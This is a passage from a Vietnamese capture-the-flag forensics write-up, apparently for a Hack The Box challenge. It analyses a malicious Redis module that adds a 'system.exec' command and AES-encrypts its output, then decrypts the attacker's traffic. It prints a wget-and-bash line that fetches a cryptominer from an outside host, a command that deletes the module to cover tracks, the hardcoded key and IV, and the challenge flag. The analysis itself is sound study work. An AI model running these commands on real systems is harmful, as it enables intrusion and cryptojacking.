@@ -246,3 +246,99 @@ __int64 __fastcall DoCommand(__int64 a1, __int64 a2, int a3)
 ```
 </details>
 
+Mình không thực sự giỏi về việc giải thích toàn bộ logic của source code này nên mình chỉ nói về logic mã hóa chính của module này:
+
+```
+src = "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz";
+  v28 = "YDP7ECjzuV7sagMN";
+  strncpy(key, "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz", 0x20u);
+  strncpy(iv, v28, 0x10u);
+  cipher_new = EVP_CIPHER_CTX_new();
+  AES_MODE_CBC = EVP_aes_256_cbc();
+  EVP_EncryptInit_ex(cipher_new, AES_MODE_CBC, 0, key, iv);
+  length_plaintext = strlen(plaintext);
+  EVP_EncryptUpdate(cipher_new, ciphertxt, &update_length, plaintext, length_plaintext);
+  v20 = update_length;
+  EVP_EncryptFinal_ex(cipher_new, &ciphertxt[update_length], &update_length);
+  v20 += update_length;
+  EVP_CIPHER_CTX_free(cipher_new);
+```
+
+Ở đây đơn giản theo mình hiểu được là:
+- key: h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz
+- iv: YDP7ECjzuV7sagMN
+- Mode AES_CBC padding PKCS#7
+- Length của ciphertext sẽ được cập nhật 2 lần với lần 1 là `EVP_EncryptUpdate` và lần 2 là `EVP_EncryptFinal_ex` và sẽ được lưu toàn bộ vào biến v20
+- `EVP_EncryptInit_ex` func này sẽ đảm nhận tạo context hoặc gọi là các pattern cho việc mã hóa
+
+Tiếp theo là func được dùng để callback đến func `DoCommand()` để mỗi lần attacker sử dụng `system.exec + command` sẽ trả về một chuỗi đã encrypt:
+```
+_BOOL8 __fastcall RedisModule_OnLoad(__int64 a1)
+{
+  return (unsigned int)sub_7230(a1, "system", 1, 1) == 1
+      || (unsigned int)RedisModule_CreateCommand(a1, "system.exec", DoCommand, "readonly", 1, 1, 1) == 1;
+}
+```
+
+-> Logic của func này là mỗi khi command `system.exec` + với 1 command thì cho phép thực thi logic mã hóa của hàm `DoCommand()`.
+
+Bây giờ mình dùng những pattern này để giải quyết phần còn lại của tcp_stream eq 2 ở timeline vào lúc sau 11:42p:
+
+```
+system.exec
+$19
+rm -v ./x10SPFHN.so
+
+$64
+adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f
+
+*2
+$11
+system.exec
+$8
+uname -a
+$224
+a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3
+
+*2
+$11
+system.exec
+$113
+wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
+
+$960
+394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
+
+```
+
+Encrypt từng cái theo flow thực thi command của attacker sẽ là:
+
+```
+rm -v ./x10SPFHN.so
+-> removed './x10SPFHN.so' -> remove module khỏi ổ đĩa để xóa dấu vết forensics disk image
+
+uname -a
+-> Linux redis-master 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 GNU/Linux -> hiển thị tên của hệ điều hành đang sử dụng hiện tại
+
+wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3 -> cuối cùng là thực hiện tải xuống payload và thực thi payload
+->
+
+--- Installing ethminer ---
+--- Enabling automatically startup ---
+--- Setting env ---
+ETHMINER_PATH=/tmp/ethminer
+HOSTNAME=redis-master
+REDIS_DOWNLOAD_SHA=5c76d990a1b1c5f949bcd1eed90d0c8a4f70369bdbdcb40288c561ddf88967a4
+PWD=/data
+HOME=/root
+REDIS_VERSION=7.2.1
+REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.2.1.tar.gz
+SHLVL=4
+FLAG_PART=_un3xp3c73d_7r41l5!}
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+--- Success! ---
+```
+Cuối cùng payload dược tải xuống ở đây là `ethminer` mình có googling thử đây là gì, thì nó là một mã nguồn mở tools dùng để đào tiền điện tử, và việc nó được đặt trong folder /tmp/ cũng như có cả hostname và hash rõ ràng cho version release thì khả năng cao ở đây sẽ là 1 phần exploit tiền điện tử cho phần cuối của challenge
+
+**flag: HTB{r3d15_1n574nc35_c0uld_0p3n_n3wun3xp3c73d_7r41l5!}**
